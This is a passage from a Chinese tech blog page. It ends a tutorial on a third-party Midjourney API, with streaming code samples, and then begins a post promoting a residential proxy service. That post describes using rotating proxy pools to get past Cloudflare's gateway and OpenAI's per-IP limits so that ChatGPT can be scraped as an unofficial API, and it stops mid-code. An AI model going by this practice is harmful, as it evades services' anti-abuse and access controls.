                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"8aad0fe0-2300-4702-94dc-39a5d3e2f2f3"</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upsample1"</span>,</span><br><span class="line">    <span class="string">"upsample2"</span>,</span><br><span class="line">    <span class="string">"upsample3"</span>,</span><br><span class="line">    <span class="string">"upsample4"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1103693480024363198"</span>,</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1100813695770165341/1103693480024363198/Azyern_Zieca_ignore8aad0fe0-2300-4702-94dc-39a5d3e2f2f3_a_beaut_b3d5720a-b917-4a2d-b6e7-ae641ee7ca4f.png"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 <code>success</code> 字段标识了该任务是否执行成功，如果执行成功，还会有同样的 <code>actions</code>, <code>image_id</code>, <code>image_url</code> 字段，和上文介绍的返回结果是一样的，另外还有 <code>task_id</code> 用于标识任务，以实现 Webhook 结果和最初 API 请求的关联。</p>
                  <p>如果图片生成失败，Webhook URL 则会收到类似如下内容：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"7ba0feaf-d20b-4c22-a35a-31ec30fc7715"</span>,</span><br><span class="line">  <span class="attr">"code"</span>: <span class="string">"bad_request"</span>,</span><br><span class="line">  <span class="attr">"detail"</span>: <span class="string">"Unrecognized argument(s): `-c`, `x`"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里的 <code>success</code> 字段会是 <code>false</code>，同时还会有 <code>code</code> 和 <code>detail</code> 字段描述了任务错误的详情信息，Webhook 服务器根据对应的结果进行处理即可。</p>
                  <h2 id="流式输出"><a href="#流式输出" class="headerlink" title="流式输出"></a>流式输出</h2>
                  <p>Midjourney 官方在生成图片的时候是有进度的，在最开始是一张模糊的照片，然后经过几次迭代之后，图片逐渐变得清晰，最后得到完整的图片。</p>
                  <p>所以，一张图片的生成过程大约可以分为「发送命令」-&gt;「开始生图（多次迭代逐渐清晰）」-&gt;「生图完毕」的阶段。</p>
                  <p>在没开启流式输出的情况下，本 API 从发起请求到返回结果，实际上是从上述「发送命令」-&gt;「生图完毕」的全过程，中间生图的过程也全被包含在里面，由于 Midjourney 本身生成图片速度较慢，整个过程大约需要等待一分钟或更久。</p>
                  <p>所以为了更好的用户体验，本 API 支持流式输出，即当「开始生图」的时候就开始返回结果，每当绘制进度有变化，就会流式将结果输出，直至生图结束。</p>
                  <p>如果想流式返回响应，可以更改请求头里面的 <code>accept</code> 参数，修改为 <code>application/x-ndjson</code>，不过调用代码需要有对应的更改才能支持流式响应。</p>
                  <p>Python 样例代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://api.zhishuyun.com/midjourney/imagine?token=&#123;token&#125;'</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'accept'</span>: <span class="string">'application/x-ndjson'</span></span><br><span class="line">&#125;</span><br><span class="line">body = &#123;</span><br><span class="line">    <span class="string">"prompt"</span>: <span class="string">"a beautiful cat"</span>,</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"generate"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, headers=headers, json=body, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> r.iter_lines():</span><br><span class="line">    print(line.decode())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780200447578272"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780200447578272/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">0</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780227496640635"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780227496640635/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">15</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780238934523994"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780238934523994/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">31</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780254398918716"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780254398918716/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">46</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780265933262858"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780265933262858/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">62</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780280965648394"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780280965648394/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">78</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780292621598860"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780292621598860/grid_0.webp"</span>,<span class="attr">"actions"</span>:[],<span class="attr">"progress"</span>:<span class="number">93</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_id"</span>:<span class="string">"1112780319758766080"</span>,<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1111955518269948007/1112780319758766080/dawn97_ignore81c5c24e-ea94-4ae2-aee4-252a98a347ed_a_beautiful_c_e20c3bc8-8827-4c99-9cf5-7d56c2e9d47f.png"</span>,<span class="attr">"actions"</span>:[<span class="string">"upsample1"</span>,<span class="string">"upsample2"</span>,<span class="string">"upsample3"</span>,<span class="string">"upsample4"</span>,<span class="string">"variation1"</span>,<span class="string">"variation2"</span>,<span class="string">"variation3"</span>,<span class="string">"variation4"</span>],<span class="attr">"progress"</span>:<span class="number">100</span>&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，启用流式输出之后，返回结果就是逐行的 JSON 了。在这里我们用 Python 里面的 <code>iter_lines</code> 方法自动获取了下一行的内容并打印出来。</p>
                  <p>如果要手动进行处理逐行 JSON 结果的话可以使用 <code>\r\n</code> 来进行分割。</p>
                  <p>例如在浏览器环境中，用 JavaScript 的 axios 库来实现手动处理，代码可改写如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">axios(&#123;</span><br><span class="line">  url: <span class="string">"https://api.zhishuyun.com/midjourney/imagine?token=&#123;token&#125;"</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    prompt: <span class="string">"a beautiful cat"</span>,</span><br><span class="line">    action: <span class="string">"generate"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    accept: <span class="string">"application/x-ndjson"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  responseType: <span class="string">"stream"</span>,</span><br><span class="line">  method: <span class="string">"POST"</span>,</span><br><span class="line">  onDownloadProgress: <span class="function">(<span class="params">progressEvent</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = progressEvent.target.response;</span><br><span class="line">    <span class="keyword">const</span> lines = response.split(<span class="string">"\r\n"</span>).filter(<span class="function">(<span class="params">line</span>) =&gt;</span> !!line);</span><br><span class="line">    <span class="keyword">const</span> lastLine = lines[lines.length - <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">console</span>.log(lastLine);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">&#123; data &#125;</span>) =&gt;</span> <span class="built_in">Promise</span>.resolve(data));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>但注意在 Node.js 环境中，实现稍有不同，代码可写为如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">"axios"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">"https://api.zhishuyun.com/midjourney/imagine?token=&#123;token&#125;"</span>;</span><br><span class="line"><span class="keyword">const</span> headers = &#123;</span><br><span class="line">  <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">  Accept: <span class="string">"application/x-ndjson"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> body = &#123;</span><br><span class="line">  prompt: <span class="string">"a beautiful cat"</span>,</span><br><span class="line">  action: <span class="string">"generate"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">axios</span><br><span class="line">  .post(url, body, &#123; <span class="attr">headers</span>: headers, <span class="attr">responseType</span>: <span class="string">"stream"</span> &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response.status);</span><br><span class="line">    response.data.on(<span class="string">"data"</span>, (chunk) =&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(chunk.toString());</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">  &#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Java 样例代码：</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> okhttp3.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String url = <span class="string">"https://api.zhishuyun.com/midjourney/imagine?token=&#123;token&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line"></span><br><span class="line">        MediaType mediaType = MediaType.parse(<span class="string">"application/json"</span>);</span><br><span class="line">        RequestBody body = RequestBody.create(mediaType, <span class="string">"&#123;\"prompt\": \"a beautiful cat\"&#125;"</span>);</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                .url(url)</span><br><span class="line">                .post(body)</span><br><span class="line">                .addHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">                .addHeader(<span class="string">"Accept"</span>, <span class="string">"application/x-ndjson"</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        client.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Unexpected code "</span> + response);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> (BufferedReader br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> InputStreamReader(response.body().byteStream(), <span class="string">"UTF-8"</span>))) &#123;</span><br><span class="line">                    String responseLine;</span><br><span class="line">                    <span class="keyword">while</span> ((responseLine = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        System.out.println(responseLine);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果都是类似的。</p>
                  <p>另外注意到，流式输出的结果多了一个字段叫做 <code>progress</code>，这个代表绘制进度，范围是 0-100，如果需要，您也可以在页面展示这个信息。</p>
                  <blockquote>
                    <p>注意：当绘制未完全完成的时候，<code>actions</code> 字段是空，即无法对中间过程的图片做进一步的处理操作。绘制完毕之后，绘制过程中产生的 <code>image_url</code> 会被销毁。另外异步回调可以和流式输出一起使用。</p>
                  </blockquote>
                  <p>好了，通过以上内容介绍，我们就了解了知数云 Midjourney API 的使用方法，有了这个 API，我们可以包装自己的产品，实现和官方 Midjourney 一模一样的对接。</p>
                  <h2 id="套餐介绍"><a href="#套餐介绍" class="headerlink" title="套餐介绍"></a>套餐介绍</h2>
                  <p>到了最后，大家可能好奇，这个价格套餐式怎样的情况呢？</p>
                  <p>知数云对上文介绍的 API 提供了三种套餐，分别是快速、慢速、极速模式，介绍如下：</p>
                  <ul>
                    <li>快速：背后的 Midjourney 账号均是 Fast 模式，能够以快速模式出图，正常情况下绘制完整图片时间在 1 分钟左右，开启流式模式会更快。</li>
                    <li>慢速：背后的 Midjourney 账号均是 Relax 模式，生成速度无任何保证，快的话可能 1 分钟，慢的话可能甚至 10 分钟，适合对速度要求较低的用户。</li>
                    <li>极速：背后的 Midjourney 账号军事 Turbo 模式，生成速度比快速模式更快，正常情况下绘制完整图片时间在 30 秒左右，开启流式模式会更快。适合对速度要求极高的用户。</li>
                  </ul>
                  <p>价格怎么样呢？由于价格可能会动态变化，大家可以直接参考知数云的官方网站了解：<a href="https://data.zhishuyun.com/services/d87e5e99-b797-4ade-9e73-b896896b0461" target="_blank" rel="noopener" title="https://data.zhishuyun.com/services/d87e5e99-b797-4ade-9e73-b896896b0461">https://data.zhishuyun.com/services/d87e5e99-b797-4ade-9e73-b896896b0461</a>。但总的来说，能够以这个价格做到知数云 Midjourney API 这样的稳定性和并发的，业界寥寥无几，欢迎选购和评测。</p>
                  <p>谢谢！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2023-08-21 01:31:45" itemprop="dateCreated datePublished" datetime="2023-08-21T01:31:45+08:00">2023-08-21</time>
                </span>
                <span id="/42341.html" class="post-meta-item leancloud_visitors" data-flag-title="Midjourney API 的申请和使用" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>12k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>11 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36066.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/36066.html" class="post-title-link" itemprop="url">分享一个稳定好用的国外代理</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>许多朋友问我有没有好用的海外代理。说实话，真的好用的并不多。</p>
                  <p>最近我了解到了一家还不错的海外代理，叫做 IPIDEA，我已经使用了一段时间了，觉得质量挺不错。</p>
                  <p>你可能知道，我最近在进行一些 ChatGPT 相关的研究，由于各种原因，我需要大量的海外代理才能够使用服务，这个代理实在是帮了我大忙。如果你有需要的话，可以参考下面我对这家代理的使用体验来选购。</p>
                  <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2>
                  <p>首先，我介绍一下这家代理的一些特点。他们并不像国内的很多代理厂商一样提供的是一些国内代理。这家代理主要提供海外代理，因此他们的用户大部分是有海外代理使用需求的人。比如说，最近非常火爆的 ChatGPT，就对这类服务有很大的需求。</p>
                  <p>这家代理的官方网站是 <a href="http://www.ipidea.net/?utm-source=cqc&amp;utm-keyword=?ipidea" target="_blank" rel="noopener" title="http://www.ipidea.net/?utm-source=cqc&amp;utm-keyword=?ipidea">http://www.ipidea.net/?utm-source=cqc&amp;utm-keyword=?ipidea</a>。从他们的介绍可以看到，他们是一家全球范围的 IP 代理服务商，能覆盖全球 220 个国家和地区，大部分代理实际上是住宅 IP。</p>
                  <p>官方介绍这家的代理 IP 数量大约是九千万左右，这个数量非常庞大，同时官方介绍说代理的可用率是 99.9%。</p>
                  <p>下面我们来看一下他们的一些套餐类型：</p>
                  <ul>
                    <li>动态住宅代理：这种代理实际上就是用真实的住宅用户的 IP 搭建的代理。一般来说，住宅代理对于很多场景的使用封禁概率会比较低，因为很多厂商对封禁住宅代理是比较谨慎的。动态住宅代理其实就是可以定时切换的 IP，比如说做网络爬虫，我们就需要不断变换的不同的代理 IP，这样可以进一步的减少被封禁的概率。</li>
                    <li>静态住宅代理：相对于动态代理来说，静态住宅代理的特点就是长效稳定，可以一直获取一个稳定不变的代理 IP，适合长久的稳定的海外网络环境使用。比如说，我们要进行自动化网站的爬取，如果在一个页面内 IP 地址频繁变动会增大被风控的概率。所以，如果有一个长效稳定的住宅 IP 代理，就会非常方便。</li>
                    <li>数据中心代理：这种代理实际上是很多服务器厂商的服务器搭建起来的代理。例如腾讯云、阿里云、微软云等服务器所在的 IP 地址段，就属于所谓的数据中心的 IP 地址段。因此，用这些服务器搭建出来的代理就叫做数据中心代理。一般来说，这种数据中心代理相对于住宅代理更容易被爬虫封禁，但是这种代理的优势就是价格更加便宜，而且网络速度也会相对较好。</li>
                  </ul>
                  <p>基本上，这家代理服务商涵盖了上述这三种类型，大家可以根据自己的需要来选择购买。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>首先，如果要使用代理的话，第一步自然是注册和登录，</p>
                  <p>这里值得一提的是，这家代理支持免费的测试，不需要一定充值才能用，就官网直接注册就可以获得一些免费额度：</p>
                  <p><img src="https://cdn.cuiqingcai.com/2j10gy.png" alt=""></p>
                  <p>注册和登录的详细流程我就不赘述了，注册登录完之后还需要进行实名认证才能开始使用代理。</p>
                  <p>下面，我会简单介绍一下这个代理服务的基本使用方法。你可以点击菜单上方的“获取代理”，然后会跳转到以下页面。</p>
                  <p><a href="https://www.ipidea.net/getapi/" target="_blank" rel="noopener">https://www.ipidea.net/getapi/</a></p>
                  <p>这里的代理使用方式分为两种，第一种是 API 提取的方式，第二种是隧道代理。下面我会先介绍第一种，即 API 提取的方式。</p>
                  <p>如图所示，我们切换到 API 提取方式的介绍页面，这里有三个子菜单：全球动态、独享数据中心、静态住宅。这三种类型我已在前面的介绍中涉及过，就不再详述。</p>
                  <p><img src="https://cdn.cuiqingcai.com/72xe3u.png" alt=""></p>
                  <p>以全球动态这一菜单为例，你可以看到页面下方显示了当前账户的余额和一些流量信息。再下方则是 API 提取的相关配置。</p>
                  <p>下面有许多配置选项，如提取数量、国家和地区、协议、数据格式、分隔符等，我们可以按需选择，然后点击按钮生成提取链接。</p>
                  <p>生成提取链接后，系统会自动提示是否加入白名单，因为这家代理商要求必须添加白名单才能使用代理。然后我们可以在右侧找到 API 提取的链接。</p>
                  <p>打开这个链接，我们就可以获取一部分代理的 IP 和端口信息。因为我们刚刚添加了白名单，所以当前这台主机可以直接提取。</p>
                  <p><img src="https://cdn.cuiqingcai.com/48pusn.png" alt=""></p>
                  <p>后面的步骤我就不再赘述，我们可以直接使用爬虫将代理设置上，然后进行网站的爬取。</p>
                  <p>第二种就是隧道代理，简单来说，我们在设置代理时不需要知道具体的 IP 和端口。这个代理隧道可以帮助我们自动选择可用的代理，我们只需要设置一条固定的代理即可。</p>
                  <p><img src="https://cdn.cuiqingcai.com/poq7t0.png" alt=""></p>
                  <p>在下方有相应的教程，你可以看到这里有动态、长效 ISP 和动态数据中心这三种选项。</p>
                  <p>使用方法类似，我们可以在下方自由选择配置，然后进行代理隧道的设置。</p>
                  <p>在左侧选择完后，右侧会出现对应的命令行，我们可以直接复制这个命令完成代理的测试。</p>
                  <p><img src="https://cdn.cuiqingcai.com/owt8is.png" alt=""></p>
                  <p>你可以看到这里，我们请求了一个测试网站，然后测试网站就可以将当前代理 IP 的相关信息打印出来。</p>
                  <blockquote>
                    <p>这里值得注意的是，如果要使用这个代理，需要在海外环境中。在国内环境是无法使用的。</p>
                  </blockquote>
                  <h2 id="使用过程"><a href="#使用过程" class="headerlink" title="使用过程"></a>使用过程</h2>
                  <p>接下来，我将简单分享一下我使用这些代理的过程。</p>
                  <p>近期，我在研究 ChatGPT 相关服务的搭建，因此在这个过程中，我确实有很多使用代理的需求。</p>
                  <h3 id="动态数据中心-全球动态"><a href="#动态数据中心-全球动态" class="headerlink" title="动态数据中心/全球动态"></a>动态数据中心/全球动态</h3>
                  <p>我将动态数据中心和全球动态一起进行说明，因为它们的使用方式基本相同，二者的区别在于前者主要提供数据中心的代理 IP，而后者主要提供动态的住宅代理。因此，前者的价格相对较低，而后者的价格和质量则相对较高。</p>
                  <p>我使用这些代理的主要场景是搭建 ChatGPT 相关的 API，但这个 API 并非使用官方 OpenAI 的 key，而是用爬虫模拟网页的方式实现的。如果你感兴趣的话，可以了解一些开源项目，例如<a href="https://github.com/acheong08/ChatGPT" target="_blank" rel="noopener" title="https://github.com/acheong08/ChatGPT">https://github.com/acheong08/ChatGPT</a>，该项目的 V1 版本就是采用爬虫模拟网页形式实现 API 服务的。</p>
                  <p>那么，为什么我们需要代理呢？</p>
                  <p>实际上在这个服务背后，我们需要一个可以绕过 Cloudflare 网关的服务，而搭建这个网关就需要大量的动态代理，这样我们就可以突破单个 IP 地址请求 OpenAI 服务的限制。</p>
                  <p>如果你感兴趣，可以了解一些开源的实现，如<a href="https://github.com/acheong08/ChatGPT-Proxy-V4" target="_blank" rel="noopener" title="https://github.com/acheong08/ChatGPT-Proxy-V4">https://github.com/acheong08/ChatGPT-Proxy-V4</a>。</p>
                  <p>在这个服务背后，你会注意到有一个代理设置：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">func <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> http_proxy != <span class="string">""</span> &#123;</span><br><span class="line">    client.SetProxy(http_proxy)</span><br><span class="line">    println(<span class="string">"Proxy set:"</span> + http_proxy)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  PORT := os.Getenv(<span class="string">"PORT"</span>)</span><br><span class="line">  <span class="keyword">if</span> PORT == <span class="string">""</span> &#123;</span><br><span class="line">    PORT = <span class="string">"9090"</span></span><br><span class="line">  &#125;</span><br><span class="line">  handler := gin.Default()</span><br><span class="line">  handler.GET(<span class="string">"/ping"</span>, func(c *gin.Context) &#123;</span><br><span class="line">    c.JSON(200, gin.H&#123;<span class="string">"message"</span>: <span class="string">"pong"</span>&#125;)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  handler.Any(<span class="string">"/api/*path"</span>, proxy)</span><br><span class="line"></span><br><span class="line">  gin.SetMode(gin.ReleaseMode)</span><br><span class="line">  endless.ListenAndServe(os.Getenv(<span class="string">"HOST"</span>)+<span class="string">":"</span>+PORT, 